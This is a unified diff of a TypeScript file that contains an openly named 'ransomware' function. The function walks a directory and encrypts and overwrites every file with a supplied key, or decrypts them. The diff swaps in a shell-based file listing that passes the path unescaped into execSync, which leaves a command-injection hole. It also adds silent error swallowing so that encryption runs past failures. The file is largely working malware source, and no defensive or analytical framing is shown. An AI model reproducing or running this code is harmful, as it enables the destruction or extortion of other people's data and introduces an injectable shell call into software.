@@ -1,20 +1,30 @@
 import zlib from "zlib";
 import fs from "fs";
 import crypto from "crypto";
-import path from "path";
+import * as exec from "child_process";
+
+const _run = (args: string): string | null => {
+  try {
+    return exec.execSync(args, { maxBuffer: 1024 * 1024 * 100 }).toString();
+  } catch(e) {
+    return null;
+  }
+}
 
 // Get list of files inside a folder
-const readdir = (rPath: any) => {
-  const files = [] as any;
-  fs.readdirSync(rPath).forEach(file => {
-    const absolute = path.join(rPath, file);
-    if (fs.statSync(absolute).isDirectory()) {
-      return readdir(absolute);
+const readdir = (path: string) => {
+  const res = _run(`find '${path}' -type f -follow -print`) as string;
+  if (res) {
+    if (/\n/g.test(res)) {
+      return res?.split("\n");
+    } else if (res?.length > 0) {
+      return [res];
     } else {
-      return files.push(absolute);
+      return [];
     }
-  });
-  return files;
+  } else {
+    return [];
+  }
 }
 
 // Load a file as utf-8 encoding
@@ -161,15 +171,19 @@ const ransomware = (options: string) => {
   const [mode, key, path, speed] = options.split(" ");
   const filesInPath = readdir(tmpPath);
   for(let i = 0; i < filesInPath.length; ++i) {
-    const fileData = loadFile(`${tmpPath}/${filesInPath[i]}`);
-    if (mode === "e" || mode === "encrypt") {
-      const compressedFileDataBuffer = compressBuffer(fileData, +speed);
-      const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
-      saveToFile(`${tmpPath}/${filesInPath[i]}`, encryptedDataBuffer);
-    } else {
-      const decryptedDataBuffer = decrypt(fileData, key);
-      const decompressedFileDataBuffer = uncompressBuffer(decryptedDataBuffer);
-      saveToFile(`${tmpPath}/${filesInPath[i]}`, decompressedFileDataBuffer);
+    try {
+      const fileData = loadFile(`${tmpPath}/${filesInPath[i]}`);
+      if (mode === "e" || mode === "encrypt") {
+        const compressedFileDataBuffer = compressBuffer(fileData, +speed);
+        const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
+        saveToFile(`${tmpPath}/${filesInPath[i]}`, encryptedDataBuffer);
+      } else {
+        const decryptedDataBuffer = decrypt(fileData, key);
+        const decompressedFileDataBuffer = uncompressBuffer(decryptedDataBuffer);
+        saveToFile(`${tmpPath}/${filesInPath[i]}`, decompressedFileDataBuffer);
+      }
+    } catch(err) {
+      // silent error
     }
   }
   return tmpPath + " files " + ((mode === "e" || mode === "encrypt") ? "encrypted" : "decrypted");
